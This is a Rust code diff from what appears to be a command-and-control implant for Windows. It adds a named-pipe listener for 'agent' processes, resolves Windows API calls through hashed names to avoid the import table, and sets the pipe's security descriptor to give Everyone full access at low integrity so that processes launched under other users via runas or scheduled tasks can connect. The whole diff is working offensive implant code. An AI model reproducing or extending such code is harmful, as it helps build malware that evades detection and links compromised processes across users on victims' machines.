@@ -27,9 +27,17 @@ type FnDisconnectNamedPipe = unsafe extern "system" fn(HANDLE) -> i32;
 type FnCancelIoEx        = unsafe extern "system" fn(HANDLE, *const core::ffi::c_void) -> i32;
 type FnSleep             = unsafe extern "system" fn(u32);
 
+// Dynamic function type for ConvertStringSecurityDescriptorToSecurityDescriptorW (advapi32)
+type FnConvertSddl = unsafe extern "system" fn(*const u16, u32, *mut *mut core::ffi::c_void, *mut u32) -> i32;
+
 fn resolve_k32(fn_hash: u32) -> usize {
     const H_K32: u32 = crate::api_hash::hash_dll(b"kernel32.dll");
     unsafe { crate::api_hash::resolve_fn(H_K32, fn_hash) }
+}
+
+fn resolve_adv32(fn_hash: u32) -> usize {
+    const H_ADV: u32 = crate::api_hash::hash_dll(b"advapi32.dll");
+    unsafe { crate::api_hash::resolve_fn(H_ADV, fn_hash) }
 }
 
 macro_rules! lazy_fn {
@@ -42,11 +50,52 @@ macro_rules! lazy_fn {
     };
 }
 
+macro_rules! lazy_fn_adv {
+    ($name:ident, $ty:ty, $hash:expr) => {
+        fn $name() -> Option<$ty> {
+            static ADDR: OnceLock<usize> = OnceLock::new();
+            let addr = *ADDR.get_or_init(|| resolve_adv32($hash));
+            if addr == 0 { None } else { Some(unsafe { core::mem::transmute(addr) }) }
+        }
+    };
+}
+
 lazy_fn!(fn_create_named_pipe, FnCreateNamedPipeW,  crate::api_hash::hash(b"CreateNamedPipeW"));
 lazy_fn!(fn_connect_named_pipe, FnConnectNamedPipe, crate::api_hash::hash(b"ConnectNamedPipe"));
 lazy_fn!(fn_disconnect_named_pipe, FnDisconnectNamedPipe, crate::api_hash::hash(b"DisconnectNamedPipe"));
 lazy_fn!(fn_cancel_io_ex, FnCancelIoEx, crate::api_hash::hash(b"CancelIoEx"));
 lazy_fn!(fn_sleep, FnSleep,             crate::api_hash::hash(b"Sleep"));
+lazy_fn_adv!(fn_convert_sddl, FnConvertSddl, crate::api_hash::hash(b"ConvertStringSecurityDescriptorToSecurityDescriptorW"));
+
+// SECURITY_ATTRIBUTES for CreateNamedPipeW
+#[repr(C)]
+struct SecurityAttributes {
+    n_length:               u32,
+    lp_security_descriptor: *mut core::ffi::c_void,
+    b_inherit_handle:       i32,
+}
+
+unsafe impl Send for SecurityAttributes {}
+unsafe impl Sync for SecurityAttributes {}
+
+/// Build pipe SECURITY_ATTRIBUTES: Everyone DACL + Low-integrity SACL.
+/// Returns (SecurityAttributes, sd_ptr) — caller must LocalFree sd_ptr on drop.
+/// Falls back to null SA on failure (same as before, should not happen on modern Windows).
+fn make_pipe_sa() -> (SecurityAttributes, *mut core::ffi::c_void) {
+    // S:(ML;;NW;;;LW) = Low integrity SACL; D:(A;;0x1f019f;;;WD) = Everyone full access
+    let sddl: Vec<u16> = "S:(ML;;NW;;;LW)D:(A;;0x1f019f;;;WD)\0"
+        .encode_utf16().collect();
+    let mut sd: *mut core::ffi::c_void = core::ptr::null_mut();
+    if let Some(f) = fn_convert_sddl() {
+        unsafe { f(sddl.as_ptr(), 1, &mut sd, core::ptr::null_mut()); }
+    }
+    let sa = SecurityAttributes {
+        n_length:               core::mem::size_of::<SecurityAttributes>() as u32,
+        lp_security_descriptor: sd,
+        b_inherit_handle:       0,
+    };
+    (sa, sd)
+}
 
 // ── Raw pipe I/O (ReadFile/WriteFile already in IAT from other modules) ──────
 extern "system" {
@@ -276,6 +325,14 @@ fn run_accept_loop(
     let disconnect_pipe = fn_disconnect_named_pipe();
     let sleep_fn = fn_sleep();
 
+    // Security: Everyone DACL + Low-integrity SACL so cross-user children (runas/schtask) can connect.
+    let (sa, _sa_sd) = make_pipe_sa();
+    let sa_ptr: *const core::ffi::c_void = if sa.lp_security_descriptor.is_null() {
+        core::ptr::null()
+    } else {
+        &sa as *const SecurityAttributes as *const core::ffi::c_void
+    };
+
     const ERROR_PIPE_CONNECTED: u32 = 535;
     let mut first_iter = true;
 
@@ -284,7 +341,7 @@ fn run_accept_loop(
             Some(f) => unsafe {
                 f(wname.as_ptr(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE,
                   PIPE_UNLIMITED_INSTANCES, 65536, 65536, 0,
-                  core::ptr::null())
+                  sa_ptr)
             },
             None => INVALID_HANDLE_VALUE,
         };
@@ -323,7 +380,11 @@ fn run_accept_loop(
 
         let pid_c = parent_id.clone();
         std::thread::spawn(move || {
-            handle_connection(h, &pid_c);
+            // catch_unwind prevents a panic in handle_connection from aborting
+            // the accept loop or the parent agent process.
+            let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                handle_connection(h, &pid_c)
+            }));
             if let Some(f) = fn_disconnect_named_pipe() { unsafe { f(h); } }
             unsafe { CloseHandle(h); }
         });
